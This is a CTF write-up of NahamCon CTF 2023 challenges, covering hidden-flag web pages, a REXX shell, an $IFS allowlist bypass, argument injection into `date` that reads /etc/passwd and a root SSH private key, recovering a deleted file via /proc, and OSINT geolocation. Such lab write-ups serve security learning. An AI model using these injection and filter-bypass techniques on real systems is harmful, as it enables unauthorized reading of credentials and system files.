---
title: "NahamConCTF_2023"
date: 2023-06-20T20:41:32-05:00
---
## Warmup
### Fast Hands
>Author: @JohnHammond#6971  
>
>You can capture the flag, but you gotta be fast!
--------------------------------------
We are given a button to Capture The Flag:

![Pasted image 20230616141050.png](images/20230616141050.png)

Clicking the button opens a new window that closes rather abruptly. The challenge prompt suggests we be quick, so I am thinking a `curl` request might be good since the contents do not close. Right clicking does not, however, allow me to copy a link url. 
I decided to see how this action is behaving when redirected through burp:

![Pasted image 20230616141445.png](images/20230616141445.png)

Interception does indeed work great. We can see on click, we are redirected to /capture_the_flag.html.

When we manually follow the link:

![Pasted image 20230616141617.png](images/20230616141617.png)

It's another button, but doesn't appear to be working too well. Viewing page source with Ctrl+U, we can see the flag within the code:
```html
<div class="container p-5">
            <div class="text-center mt-5 p-5">
                <button type="button" onclick="ctf()" class="btn btn-success"><h1>Your flag is:<br>
                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                  <span style="display:none">
                  flag{80176cdf1547a9be54862df3568966b8}
                </span></button>
            </div>
```

`flag{80176cdf1547a9be54862df3568966b8}`


Alternatively, we could have curled http://challenge.nahamcon.com:31565/capture_the_flag.html to achieve the same results.

```bash
$ curl -s http://challenge.nahamcon.com:31565/capture_the_flag.html | grep flag

                <button type="button" onclick="ctf()" class="btn btn-success"><h1>Your flag is:<br>
                  flag{80176cdf1547a9be54862df3568966b8}
```

### Glasses
>Author: @JohnHammond#6971  
>  
>Everything is blurry, I think I need glasses!
---------------------------------
Visiting the page gives us a very non-interactive page where we might buy glasses.
Checking the source code with ctrl+U is an absolute mess. However, since everything I interact with does not take me anywhere new, I want to view html code on the page. Using right click to inspect has an interesting interaction:

![Pasted image 20230615234612.png](images/20230615234612.png)

What's even more interesting is this does nothing. I still get to inspect anyways.

After leafing through the code a little bit, I do indeed find a piece that is interesting:
```html
<p class="lead">
	Can't see things because they are too blurry? Is your vision foggy, and everything looks like
	<em>this?</em>
	<span style="color: transparent;text-shadow: 0 0 5px rgba(0,0,0,0.09);text-decoration: line-through;">flag½₧8084e4530cf649814456f2a291eb81e9½―</span>
	<br>
	Test your vision with glasses! Try on this pair and see if you can see the previous sample text... you might find a lot of value! Imagine the world where you can see clearly!
```
Here is the same selection displayed on the webpage:

![Pasted image 20230615234853.png](images/20230615234853.png)

The color of our flag is transparent on top of white, and perhaps might be microscopically tiny as well. Either way, it is evident once we inspect the properties on the page.
`flag{8084e4530cf649814456f2a291eb81e9}`

### Regina
>Author: @JohnHammond#6971  
>  
>I have a tyrannosaurus rex plushie and I named it Regina! Here, you can talk to it :)
---------------------------------
Entering the challenge, we are greeted with a banner:

```bash
/usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit)
```

A quick google search shows this is a rather popular interpreter that I have never heard of. It has a very thorough man page located [here](https://master.dl.sourceforge.net/project/regina-rexx/regina-documentation/3.9.4/regina.pdf?viasf=1). However, no matter what my input is, I cannot seem to get a response. I learned the proper syntax that should work for testing purposes, but nothing connects back:

```bash
/usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit)
Say "Test"

client_loop: send disconnect: Broken pipe
```

After trying things for quite a while, right before giving up, I miraculously stumbled upon a response somehow:

```
/usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit)
'say test'
;
run
'say test';
Say "Test";
exec
run
;
go
^F
mysh: say: not found
 
^Fmy
my
sh: RUN: not found

sh: say: not found
Test
 
sh: EXEC: not found

sh: RUN: not found
Ssh: GO: not found
Connection to challenge.nahamcon.com closed.
```

While just enough to keep me from giving up, I had a lot of trouble recreating this still. While I had pressed \^F in the cli, I was under the impression that I also had pressed \^D and this keystroke was important for the execution. However, simply pressing \^D on its own ended up terminating the `ssh` connection.

Eventually I landed on a goofy pattern to execute, where I write my commands, quickly press the `enter` key two times, immediately followed by \^D, then another `enter` stroke. With this, my commands would be executed and then the connection terminated.

```bash
/usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit)
ADDRESS SYSTEM "ls"
Say "Test"


  
flag.txt
Test
Connection to challenge.nahamcon.com closed.
```


```bash
/usr/local/bin/regina: REXX-Regina_3.9.4(MT) 5.00 25 Oct 2021 (64 bit)
ADDRESS SYSTEM "cat flag.txt"
Say "Test"



  
flag{2459b9ae7c704979948318cd2f47dfd6}
Test
Connection to challenge.nahamcon.com closed.
```

CTRL+D is commonly used for exiting programs, so it is somewhat sensible that it finalizes REXX-Regina for execution. Was this intended, though? It certainly felt like a strange way to interact.

## Misc
---------------------
### Goose Chase
>Author: @JohnHammond#6971  
>  
>I am truly sorry. I really do apologize... I _hope_ you can bear with me as I set you all loose together, on a communal collaboriative _wild goose chase_.
-------------------------------------
Within the google sheet, we see a hidden sheet if we check the bottom left:

![Pasted image 20230615161723.png](images/20230615161723.png)

It seems there is no way to view this as long as it is owned by somebody else, but it is possible to clone it into my own google sheet:

![Pasted image 20230615161942.png](images/20230615161942.png)

Under our copied version, we can make the hidden sheet viewable. Within the hidden sheet seems to be a formula importing from another sheet, only viewable after turning on formulas (`View` -> `Show` -> `Formulas`).

![Pasted image 20230615162221.png](images/20230615162221.png)

Following this page again looks like an empty sheet. Just to be sure, i exported the sheet to a csv. Without editing the saved file, I learned that the flag was present in the file name:
```
Goose Chase - Google Sheets - ... - Google Sheets - ... flag{323264294cc2a4ebb2c8d5f9e0afb0f7} - Google Sheets - Goose Chase.csv
```
It isn't obvious until I had exported, but it appears the flag was buried deep within the title name of the second sheet project. This can be verified using browser view, the flag is also present on hovering over the window:

![Pasted image 20230615162731.png](images/20230615162731.png)

`flag{323264294cc2a4ebb2c8d5f9e0afb0f7}`

### One Zero
>Author: @JohnHammond#6971  
>  
>You only get one zero. ;)
------------------------------
_NOTE_, *This solution utilizes an unintended interaction*.

We are given a file to see the restrictions placed. Once we are ready to give it a try, we ssh to their designated port.

```bash
shopt -s extdebug
function one_zero() {
    if [[ "$BASH_COMMAND" =~ ^[\$\&+:\;=\?@\#|\<\>.\^\*()\%\!0-]+ ]]; then
        num_zero=$(awk '{print gsub(/0/, "")}' <<< "$BASH_COMMAND")
        if [[ $num_zero -le 1 ]]; then
            return; 
        else
            echo "You are only allowed one zero. :)"
            return 1;
        fi
    fi
    echo "Sorry, you used a character that is not in the allowlist!"
    return 1;
}

trap 'one_zero' DEBUG
```

We can see there is a very strict character on the allowlist, but also that more than 1 zero and we trip the 2nd if statement, telling us only 1 zero allowed.

Jumping right in I learned that we can still pass env variables:
```bash
user@one_zero:~$ $TERM
bash: xterm-256color: command not found
user@one_zero:~$ $HOME
bash: /home/user: Is a directory
```
In these cases, I don't even need my precious zero! But what to do with them? The answer is not so clear.
Next I found that I can append letter characters after a zero, and I still bypass the allowlist:
```bash
user@one_zero:~$ 0whoami
bash: 0whoami: command not found
```
So far nothing is workable. After attempting some other additional operators:
```bash
user@one_zero:~$ 0||whoami
bash: 0: command not found
Sorry, you used a character that is not in the allowlist!
```

My operators are not exactly blacklisted, but being 2 separate commands still goes through the allowlist check, which my whoami inevitably fails.

I know the bash special variable `$IFS` is known to be rather effective at bypassing some tricky filter settings, so I decided to try it out here and see what happens:

```bash
user@one_zero:~$ ${IFS}whoami
user
user@one_zero:~$ ${IFS}ls
flag.txt
```

In an unexpected twist, it appears using $IFS at the start of the command results in any subsequent input bypassing the filter!
From here it's a simple `cat` away:

```bash
user@one_zero:~$ ${IFS}cat flag.txt
flag{81b9de37f5bd218c9f59ac2d9d709bf6}
```

### Wordle Bash
>Author: @JohnHammond#6971  
>  
>We put a new novel spin on the old classic game of Wordle! Now it's written in bash! :D  
>  
>Oh, and you aren't guessing words, this time...
--------------------------
Upon ssh, we find the wordle challenge. It's umpiled shell code, so firstly let's take a look:
```bash
#!/bin/bash

YEARS=("2020" "2021" "2022" "2023" "2024" "2025")
MONTHS=("01" "02" "03" "04" "05" "06" "07" "08" "09" "10" "11" "12" )
DAYS=("01" "02" "03" "04" "05" "06" "07" "08" "09" "10" "11" "12" "13" "14" "15" "16" "17" "18" "19" "20" "21" "22" "23" "24" "25" "26" "27" "28" "29" "30" "31")

YEARS_SIZE=${#YEARS[@]}
YEARS_INDEX=$(($RANDOM % $YEARS_SIZE))
YEAR=${YEARS[$YEARS_INDEX]}

MONTHS_SIZE=${#MONTHS[@]}
MONTHS_INDEX=$(($RANDOM % $MONTHS_SIZE))
MONTH=${MONTHS[$MONTHS_INDEX]}

DAYS_SIZE=${#DAYS[@]}
DAYS_INDEX=$(($RANDOM % $DAYS_SIZE))
DAY=${DAYS[$DAYS_INDEX]}

TARGET_DATE="${YEAR}-${MONTH}-${DAY}"

gum style \
  --foreground 212 --border-foreground 212 --border double \
  --align center --width 50 --margin "1 2" --padding "2 4" \
  'WORDLE DATE' 'Uncover the correct date!'

echo "We've selected a random date, and it's up to you to guess it!"

wordle_attempts=1
while [ $wordle_attempts -le 5 ]
do
  echo "Attempt $wordle_attempts:"
  echo "Please select the year you think we've chosen:"
  chosen_year=$(gum choose ${YEARS[@]})

  echo "Now, enter the month of your guess: "
  chosen_month=$(gum choose ${MONTHS[@]})

  echo "Finally, enter the day of your guess: "
  chosen_day=$(gum choose ${DAYS[@]})
  
  guess_date="$chosen_year-$chosen_month-$chosen_day"
  
  if ! date -d $guess_date; then
    echo "Invalid date! Your guess must be a valid date in the format YYYY-MM-DD."
    exit
  fi

  confirmed=1
  while [ $confirmed -ne 0 ]
  do
    gum confirm "You've entered '$guess_date'. Is that right?"
    confirmed=$?
    if [[ $confirmed -eq 0 ]]
    then
      break
    fi
    echo "Please select the date you meant:"
    guess_date=$(gum input --placeholder $guess_date)
  done

  if [[ $(date $guess_date) == $(date -d $TARGET_DATE +%Y-%m-%d) ]]; then
    gum style \
      --foreground 212 --border-foreground 212 --border double \
      --align center --width 50 --margin "1 2" --padding "2 4" \
      "Congratulations, you've won! You correctly guessed the date!" 'Your flag is:' $(cat /root/flag.txt)
    exit 0
  else
    echo "Sorry, that wasn't correct!"
    echo "====================================="
  fi

  wordle_attempts=$((wordle_attempts+1))
done

gum style \
  --foreground 212 --border-foreground 212 --border double \
  --align center --width 50 --margin "1 2" --padding "2 4" \
  "Sorry, you lost." "The correct date was $TARGET_DATE."

```

We can see the dates are generated "randomly" upon launch, so my first thought is to run 2 instances simultaneously. If the dates can match up, then it will be an easy win:
```bash
user@wordle:~$ ./wordle_bash.sh & ./wordle_bash.sh








```

It works as expected, but I hadn't considered that in order to see the flag it had to be run as sudo. A quick check on sudo privs shows me that I am indeed capable:
```bash
user@wordle:~$ sudo -l
<... SNIP ...>
User user may run the following commands on wordle-bash-d18d8fe5e302e98a-89966b69d-lv5gw:
    (root) /home/user/wordle_bash.sh
```

However, running 2 sudo instances became very problematic, as I am asked for password on every launch. If one sudo process is immediately sent to `bg`, it will fail to launch once i try to `fg`, since the password had not really been submitted.

After spending too long on trying to run 2 processes simultaneously, I looked more thoroughly at the userinput we could control. I noticed that after selecting dates, you are asked confirmation. If you say no, you can supply your own input with interesting results:
```bash
Please select the date you meant:
                                                          
You've entered '-d $TARGET_DATE +%Y-%m-%d'. Is that right?
date: invalid date ‘$TARGET_DATE’
Sorry, that wasn't correct!
```

The `date` function seems to be recognizing the -d flag without issue? Perhaps we are able to provide our own arguments to execute.

The [GTFObins](https://gtfobins.github.io/gtfobins/date/) site has a page for `date`; we might be able to utilize arbitrary read capabilities.
```bash
Please select the date you meant:
                                               
You've entered '-f /etc/passwd'. Is that right?
date: invalid date ‘root:x:0:0:root:/root:/bin/bash’
date: invalid date ‘bin:x:1:1:bin:/bin:/sbin/nologin’
date: invalid date ‘daemon:x:2:2:daemon:/sbin:/sbin/nologin’
date: invalid date ‘adm:x:3:4:adm:/var/adm:/sbin/nologin’
date: invalid date ‘lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin’
date: invalid date ‘sync:x:5:0:sync:/sbin:/bin/sync’
date: invalid date ‘shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown’
date: invalid date ‘halt:x:7:0:halt:/sbin:/sbin/halt’
date: invalid date ‘mail:x:8:12:mail:/var/mail:/sbin/nologin’
date: invalid date ‘news:x:9:13:news:/usr/lib/news:/sbin/nologin’
date: invalid date ‘uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin’
date: invalid date ‘operator:x:11:0:operator:/root:/sbin/nologin’
date: invalid date ‘man:x:13:15:man:/usr/man:/sbin/nologin’
date: invalid date ‘postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin’
date: invalid date ‘cron:x:16:16:cron:/var/spool/cron:/sbin/nologin’
date: invalid date ‘ftp:x:21:21::/var/lib/ftp:/sbin/nologin’
date: invalid date ‘sshd:x:22:22:sshd:/dev/null:/sbin/nologin’
date: invalid date ‘at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin’
date: invalid date ‘squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin’
date: invalid date ‘xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin’
date: invalid date ‘games:x:35:35:games:/usr/games:/sbin/nologin’
date: invalid date ‘cyrus:x:85:12::/usr/cyrus:/sbin/nologin’
date: invalid date ‘vpopmail:x:89:89::/var/vpopmail:/sbin/nologin’
date: invalid date ‘ntp:x:123:123:NTP:/var/empty:/sbin/nologin’
date: invalid date ‘smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin’
date: invalid date ‘guest:x:405:100:guest:/dev/null:/sbin/nologin’
date: invalid date ‘nobody:x:65534:65534:nobody:/:/sbin/nologin’
date: invalid date ‘user:x:1000:1000:Linux User,,,:/home/user:/home/user/.user-entrypoint.sh’
Sorry, that wasn't correct!
```
With arbitrary read, we should be able to display the contents of the flag.txt as well!
```bash
Please select the date you meant:
                                                  
You've entered '-f /root/flag.txt'. Is that right?
date: invalid date ‘[ Sorry, your flag will be displayed once you have code execution as root ]’
Sorry, that wasn't correct!
```
Unexpectedly, it looks like flag.txt was a bait after all. It says we must have code execution as root for the flag, but I thought perhaps I can "guess" the name of the flag file using wildcards:
```bash
Please select the date you meant:
                                           
You've entered '-f /root/*'. Is that right?
date: the argument ‘/root/get_flag_random_suffix_345674837560870345’ lacks a leading '+';
when using an option to specify date(s), any non-option
argument must be a format string beginning with '+'
Try 'date --help' for more information.
Sorry, that wasn't correct!
```
We find an interesting file name. Once more, using exactly this name:
```
Wed Jan  1 00:00:00 UTC 2020
Please select the date you meant:
                                                                                   
You've entered '-f /root/get_flag_random_suffix_345674837560870345'. Is that right?
date: invalid date ‘\177ELF\002\001\001’
date: invalid date ‘:’
date: invalid date ‘.\001?\031\003\016:\v;\v9\vI\023<\031\001\023’
Sorry, that wasn't correct!
```
This is a binary executable, likely containing our flag once we execute as root. So, clearly, we do indeed need code execution as root.

Eventually, I thought to look for ssh keys in `/root/.ssh/id_rsa`:
```bash
date: invalid date ‘-----BEGIN OPENSSH PRIVATE KEY-----’
date: invalid date ‘b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn’
date: invalid date ‘NhAAAAAwEAAQAAAYEAxllMaPu/ewDglK/+qcskWbUTSiQtLBBX4Ls5EGWmGbTdKh7K7trC’
date: invalid date ‘Nht9hbSx8Ei4cLQWhbbwcvIqDAgrXYO9Vb/sr/BEyk1aVVTpFfLuFbsyZNZTqmONajdsf9’
date: invalid date ‘Kl/4Qy9u8/3duhBYaeV0Am4tK9mzM8/D2YbzmYD+pK8GFwJDQG5RdFstj6NxXjROAsaj8H’
date: invalid date ‘U7HHvkNFctEMMBmquAaG85DZO83ZUWWASB702UNrc701Mhdf7Ln92D2aEhwMisdBjK/F83’
date: invalid date ‘K71YIcrpkuDTQYhms4SGUlYIlUaIhridKH3m3BgCNhC5mjsy5IkV0VwG/SRxew0adhHxT+’
date: invalid date ‘Gc9izi2yy1uW1wrJT0u8ImQhTm35R+cLD+SpWJSHswDxygCVHTUvVIngNakJvWXRKDmS3N’
date: invalid date ‘PjIu9gaJ3D69Q3BDlxcbluhjl2Z/5nenryUZdoVORnCf75YiWgTtI/FhS7HnHyw69LaJoH’
date: invalid date ‘1NPGh/mV730OsnqtdakxkHXd3CDhcwY5QjvJlFEdAAAFgAlNDvEJTQ7xAAAAB3NzaC1yc2’
date: invalid date ‘EAAAGBAMZZTGj7v3sA4JSv/qnLJFm1E0okLSwQV+C7ORBlphm03Soeyu7awjYbfYW0sfBI’
date: invalid date ‘uHC0FoW28HLyKgwIK12DvVW/7K/wRMpNWlVU6RXy7hW7MmTWU6pjjWo3bH/Spf+EMvbvP9’
date: invalid date ‘3boQWGnldAJuLSvZszPPw9mG85mA/qSvBhcCQ0BuUXRbLY+jcV40TgLGo/B1Oxx75DRXLR’
date: invalid date ‘DDAZqrgGhvOQ2TvN2VFlgEge9NlDa3O9NTIXX+y5/dg9mhIcDIrHQYyvxfNyu9WCHK6ZLg’
date: invalid date ‘00GIZrOEhlJWCJVGiIa4nSh95twYAjYQuZo7MuSJFdFcBv0kcXsNGnYR8U/hnPYs4tsstb’
date: invalid date ‘ltcKyU9LvCJkIU5t+UfnCw/kqViUh7MA8coAlR01L1SJ4DWpCb1l0Sg5ktzT4yLvYGidw+’
date: invalid date ‘vUNwQ5cXG5boY5dmf+Z3p68lGXaFTkZwn++WIloE7SPxYUux5x8sOvS2iaB9TTxof5le99’
date: invalid date ‘DrJ6rXWpMZB13dwg4XMGOUI7yZRRHQAAAAMBAAEAAAGAECAzdPeUCOaN264hU2Gcz3RIIL’
date: invalid date ‘InQAVbd6hmX8hmhCwvAkfQR4dehx1ItmWgmoChtNFXYWtO9NwZAghp/3zV7aegZmoaKvkL’
date: invalid date ‘UT5e2DYmGCXeLNI7VBzVjZ9QQWYkBng+LShPYMoEjIP2J0bObTN6pH26cBF77VMD42Cw01’
date: invalid date ‘vrTO4z6ffbO/VQW8kk7zUV4f9vfjpJGyqx9enmsURs8PA1lDjLCIXYV2Sb/4EQzAHOCxyv’
date: invalid date ‘Zfv+LwCsvCIUqXNBVnO+N7hg5b/zh7gyvuzHq/vyOTjkNceQa7SZ/egeclWGkkYttUzUr1’
date: invalid date ‘0cveVqXTM2tfJhv8+cobJcmO7IccjsOyL+zYPR3mN/Q1nUvGyAERppXfhwTAZ5ljMRDkv/’
date: invalid date ‘KUy7IJ3Q9FnSVdqkni2u6ErHEer0/TKXAT92LYQXzTczd6hGvh+IADlmOLzU2d0RfkPZZ4’
date: invalid date ‘8GKvZfThN1OSMVpcwJMVeILWP6uz9WnnUAXgLIUriJK7rrsHpH0MNTmfTT9v5VSH3RAAAA’
date: invalid date ‘wB2od8rr4IU8AkpZ/kE9kY5a/INNsvSdUA6sn/5Fwso19fiPz2vYdP9fJMYjShV1wb8UFt’
date: invalid date ‘cajFvnnj2DnClU0imh1eC0fB5+vAmJvx8Qq9NWcmz7aejvZrBdIFbqGYr5krc5KvmizYVC’
date: invalid date ‘+tII4u4s5SFcvcZwmuIsWJQjbXA7VVa8v8Y10YJdeYsl3YpKqJdU0xPkt2Y2IgZxTJ4Dd9’
date: invalid date ‘MKgcPTBdOVuKA8r8ALCth9OV74k1GOEpLbDIY4gFiXbi7crQAAAMEA2Z0ZtNS6bUEq61DF’
date: invalid date ‘6758uI3wIeYe8NoGyxlH/oTGVqy5KfQ9vCochcSx0yov4MSZBY+foE8OAxNvAxBSV+2CnQ’
date: invalid date ‘4OHnZnKa9teSvphUCmnt4Va7CWRzmVmNiKlpMOky2P8Zfv3LdgpwrAbwxBL1HQv/eivXDm’
date: invalid date ‘0BQCxuiaOp5/3nz+K+IvA/cBhsJwS6bWMtAhcfzKfS7/NzgcLTtlVR1Li/vC/r69iDs/xi’
date: invalid date ‘zDGCjuOrjsWhqqIqjhMGZjguTz9Y+FAAAAwQDpVj6g1OSqzZ5Kw805VTcbRRTmiHb00hht’
date: invalid date ‘U4LYw5xV+1iNJ8/BijiIZaT/zXnZbzIzLBnPbzqNLW5sBPJ+eMo5wY5ZNKa/qMd4Rdj6Hx’
date: invalid date ‘pAVbuqv6sYPhj2Xl6R/yJUVRw6OGoIa0SEumrmXzbJTT25o9FgItuKOpRRWd9l4gB8Pa1I’
date: invalid date ‘LLomZzqAmpdZtcMX+ihYPAJL5UBGPkD4CO7JwHm+W36NpAEKhi/Fh6D/U/RPEtwXZEbaWY’
date: invalid date ‘vIJis7FbO7UrkAAAAJa2FsaUBrYWxpAQI=’
date: invalid date ‘-----END OPENSSH PRIVATE KEY-----’
Sorry, that wasn't correct!
```

Very nicely, the whole key is here. from this point it's a matter of creating the cleaned id_rsa file and using it to ssh as root.
```bash
$ ssh -p 32726 -i id_rsa root@challenge.nahamcon.com

root@wordle:~# cd /root
root@wordle:~# ls
flag.txt  get_flag_random_suffix_345674837560870345
root@wordle:~# ./get_flag_random_suffix_345674837560870345 
Please press Enter within one second to retrieve the flag.

flag{2b9576d1a7a631b8ce12595f80f3aba5}
```
There is even the extra precaution of needing to press Enter after running in order to retrieve the password. They were quite thorough in wanting you to have execution as root.

`flag{2b9576d1a7a631b8ce12595f80f3aba5}`

### Zombie
>Author: @JohnHammond#6971  
>  
>Oh, shoot, I could have sworn there was a flag here. Maybe it's still alive out there?
-------------------------------
Logging in, we see an interesting .user-entrypoint.sh file:
```bash
user@zombie:~$ ls -al
total 24
drwxr-sr-x    1 user     user          4096 Jun 15 22:23 .
drwxr-xr-x    1 root     root          4096 Jun 14 17:52 ..
-rwxr-xr-x    1 user     user          3846 Jun 14 17:52 .bashrc
-rw-r--r--    1 user     user            17 Jun 14 17:52 .profile
-rwxr-xr-x    1 root     root           131 Jun 14 17:52 .user-entrypoint.sh
```
the contents:
```bash
user@zombie:~$ cat ~/.user-entrypoint.sh 
#!/bin/bash

nohup tail -f /home/user/flag.txt >/dev/null 2>&1 & # 
disown

rm -f /home/user/flag.txt 2>&1 >/dev/null

bash -i
```
This looks like something that might be run upon entry. Just to check we can see our default terminal in `/etc/passwd`:
```bash
user@zombie:~$ cat /etc/passwd | grep user
user:x:1000:1000:Linux User,,,:/home/user:/home/user/.user-entrypoint.sh
```
Looks like this did indeed run and we can see very clearly the `rm` function getting rid of the flag. oops.
Also notable is the `tail -f` . The -f flag is a live following, or reading the final lines of the file.  We can also see a trailing &, meaning this has been set to background. As for `nohup`:
```bash
$ nohup
BusyBox v1.27.2 (2018-06-06 09:08:44 UTC) multi-call binary.

Usage: nohup PROG ARGS

Run PROG immune to hangups, with output to a non-tty
```
We can see this prevents accidental closings. This process is likely still running.
```bash
user@zombie:~$ ps
PID   USER     TIME   COMMAND
    1 root       0:00 /usr/sbin/sshd -D -e
    7 root       0:00 sshd: user [priv]
    9 user       0:00 sshd: user@pts/0
   10 user       0:00 {.user-entrypoin} /bin/bash /home/user/.user-entrypoint.sh -c bash
   11 user       0:00 tail -f /home/user/flag.txt
   13 user       0:00 bash -i
   18 user       0:00 bash
   25 user       0:00 ps
```
We do indeed see this process still running with a PID 11. My thinking is perhaps we can see the contents by exploring the PID in /proc/
```bash
user@zombie:~$ cd /proc/11/
user@zombie:/proc/11$ ls
arch_status      clear_refs       cpuset           fd               limits           mem              net              oom_score        projid_map       setgroups        stat             task             uid_map
attr             cmdline          cwd              fdinfo           loginuid         mountinfo        ns               oom_score_adj    root             smaps            statm            timens_offsets   wchan
auxv             comm             environ          gid_map          map_files        mounts           numa_maps        pagemap          schedstat        smaps_rollup     status           timers
cgroup           coredump_filter  exe              io               maps             mountstats       oom_adj          personality      sessionid        stack            syscall          timerslack_ns
```
`fd` refers to file descriptors, which might contain info from stdin, stdout, etc.
```bash
user@zombie:/proc/11$ cd fd
user@zombie:/proc/11/fd$ ls
0  1  2  3
user@zombie:/proc/11/fd$ ls -al
total 0
dr-x------    2 user     user             0 Jun 15 22:42 .
dr-xr-xr-x    9 user     user             0 Jun 15 22:41 ..
lr-x------    1 user     user            64 Jun 15 22:43 0 -> /dev/null
l-wx------    1 user     user            64 Jun 15 22:43 1 -> /dev/null
l-wx------    1 user     user            64 Jun 15 22:43 2 -> /dev/null
lr-x------    1 user     user            64 Jun 15 22:43 3 -> /home/user/flag.txt (deleted)
```
While we do see that it notes flag.txt is deleted. However, perhaps we can still see something, since the program is still in running memory?

```bash
user@zombie:/proc/11/fd$ cat 3
flag{6387e800943b0b468c2622ff858bf744}
```
And the flag is here. Clearly a simple `rm` might not be enough to exterminate the file out of existence. However, this situation is probably a little unusual since the `tail -f` was still running long after the rm command.

`flag{6387e800943b0b468c2622ff858bf744}`


## OSINT
### Chall1
>Author: @Gary#4657  
>  
>Head over to [https://osint.golf](https://osint.golf) and select **`chall1` under the NahamCon2023** category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!
----------------------------------------------
First challenge places us on a golf course, at some kind of ceremony/speech.
The first object of interest is the large event banner, containing the phrase "all Thailand Premier Championship". There is more text, Road to (something), that I was unable to accurately read. 

![Pasted image 20230615163821.png](images/20230615163821.png)

Searching for `all Thailand`, we quickly see a webpage for a [golf tour org](https://www.allthailandgolftour.com/). It seems like the right track. One common word that I found appearing was Singha, which might be matching in our image's banner: "Road to Singha (something)". The final word was still not readable for me, but this is enough to go on. Searching the golf tour website, I found [all Thailand Premier Championship - Road to Singha Masters](https://www.youtube.com/embed/-HSBJw_06XQ?rel=0&wmode=transparent&autoplay=1) located on the media page. Following the link takes us to a video, and right away in the video we are given a location--Singha Park in Khon Kaen.

![Pasted image 20230615164252.png](images/20230615164252.png)

![Pasted image 20230615164335.png](images/20230615164335.png)

I found the tolerance to be rather strict, so I ended up locating the same exact capture on Google Maps as well.

![Pasted image 20230615164520.png](images/20230615164520.png)

Finally with the pinpointed location, we get the flag.

`flag{3e3d01a002db29fec2a5e10ec758b852}`

### Chall2
>Author: @Gary#4657  
>  
>Head over to [https://osint.golf](https://osint.golf) and select **`chall2` under the NahamCon2023** category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!  
>_NOTE:_ The integrated compass direction is inconsistent with the actual panorama representation.
------------------------
The second challenge places us on a large boat near a dock, with vehicles on it. Unfortunately, boats very commonly travel internationally, so things such as language/flags on the boat may not give us interesting information. The land appears to have some unusual architecture, so I decided to screencap this region and see what a google image search can give me.

![Screenshot from 2023-06-15 16-50-43.png](images/2023-06-1516-50-43.png)

Very quickly I find a very similar capture, labeling it [Napoleon's Elba Hideaway](http://50yearsinitaly.blogspot.com/2012/11/napoleons-elba-hideaway.html).
The article notes that this location is in Portoferraio, Italy. 

![Pasted image 20230615165719.png](images/20230615165719.png)

![Pasted image 20230615165808.png](images/20230615165808.png)

Once again, the pointing at the dock itself is not specific enough. After a bit more trial and error, I find the exact location:

![Pasted image 20230615170122.png](images/20230615170122.png)

`flag{e54fcc18854f0adfdedf22120c346b3a}`

### Chall3
>Author: @Gary#4657  
>  
>Head over to [https://osint.golf](https://osint.golf) and select **`chall3` under the NahamCon2023** category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!
----------------------------------
We are now in a park. Notably, there are large buildings on all sides of the park. We must be in not only a major city, but a city with a sizeable space dedicated to a grassy open park. My first inclination is New York City with its quite sizeable Central Park. Checking the terrain map, the Sheep Meadow location is a wide grassy area. I look for a street view and know right away that this is a match.
From chall3:

![Pasted image 20230615170757.png](images/20230615170757.png)

From Sheep Meadow street view:

![Pasted image 20230615170908.png](images/20230615170908.png)

Once again, finding the same view location as the challenge:

![Pasted image 20230615171150.png](images/20230615171150.png)



`flag{aa1b04ee3ded3a7c3ee16be1ff85e99c}`

### Chall4
>Author: @Gary#4657  
>
>Head over to [https://osint.golf](https://osint.golf) and select **`chall4` under the NahamCon2023** category. Make sure to read the directions if you are unfamiliar with Geosint/Geoguessr!  
>_NOTE:_ The integrated compass direction is inconsistent with the actual panorama representation.
---------------------------------------
In the final Geosint challenge, we are given a drone shot of what seems to be a suburban area setting. We are too far away do identify anything such as the language on signs or country flags, but we can note the very large number of train track lanes. Some buildings in the distance appear to have uncommon architecture, but not enough for me to draw any conclusions. My first guess is to take the most eye-catching building and see what image searches can do for me.

![Screenshot from 2023-06-15 17-16-51.png](images/2023-06-1517-16-51.png)

From this image, it was quickly identified as Bratislava Castle of Bratislava, Slovakia. This location does not match geographically, but the building's design and colors match very well. The second building I searched for is the neighboring church-like building.

![Screenshot from 2023-06-15 17-27-17.png](images/2023-06-1517-27-17.png)

There were several identical matches for seemingly different buildings. However, one in particular mentions a castle with it in combination. [this web posting](https://www.komoot.com/highlight/3217858) seems to be reviewing it as a bike trail. Examining the geography in a google map search for `Schloss Ebenfurth`, it instantly became clear that this is the same location as the challenge.

![Pasted image 20230615173152.png](images/20230615173152.png)

![Pasted image 20230615173224.png](images/20230615173224.png)

